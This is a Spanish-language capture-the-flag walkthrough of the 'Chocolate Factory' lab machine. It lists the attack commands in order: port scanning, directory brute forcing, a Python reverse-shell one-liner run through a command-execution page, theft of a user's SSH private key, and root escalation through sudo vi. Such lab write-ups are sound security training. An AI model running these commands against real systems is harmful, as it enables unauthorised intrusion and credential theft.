---
description: // Tutorial //
---

# Chocolate Factory

<figure><img src="../../../.gitbook/assets/image (24).png" alt="" width="375"><figcaption></figcaption></figure>

Identificamos los puertos abiertos de la maquina victima

```
nmap IP -Pn -p- -v -n --min-rate 3000
```

<figure><img src="../../../.gitbook/assets/image (27).png" alt="" width="332"><figcaption></figcaption></figure>

Hacemos una fuerza bruta de los directorios y ficheros del dominio y nos encontramos con un login index.html y una pagina para donde hay un input para ejecutar comandos home.php, vamos a ir a esta ultima:&#x20;

```
gobuster dir -u http://IP:80/ -w DICTIONARY -x .php,.txt,.html
```

<figure><img src="../../../.gitbook/assets/image (26).png" alt="" width="563"><figcaption></figcaption></figure>

Subimos comando para una revershell con python y nos ponemos en escucha por el puerto configurado en nuestra maquina atacante&#x20;

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP-MAQUINA",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```
nc -lvp 4444
```

<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

A continuacion, abrimos una shell interactiva

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg
export TERM=xterm
```

Dentro de la carpeta /var/www/html llama la atencion el fichero key\_rev\_key, si filtramos por string el fichero podemos observar la primea key

<figure><img src="../../../.gitbook/assets/image (29).png" alt="" width="313"><figcaption></figcaption></figure>

Navegando por los directorios nos encontramos con un fichero donde se encuntra la clave publica y privada de ssh del usuario charlie&#x20;

```
cat /home/charlie/teleport
cat /home/charlie/teleport.pub
```

Ahora que tenemos el usuario y la clave privada accedemos a traves de ssh al usuario charlie&#x20;

```
chmod 600 id_rsa 
ssh -i id_rsa charlie@IP_victima
```

Accedemos a la flag de usuario

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

Podemos ver la password de charlie en el fichero validate.php

<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

### Escalada de privilegios

```
Sudo -l
```

<figure><img src="../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

Buscamos informacion en GTFO sobre la escalad de privilegios con vi

```
sudo vi -c ':!/bin/sh' /dev/null
```

<figure><img src="../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

Introducimos la flag que nos encontramos en el script de pyhton para sacar la flag de root

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

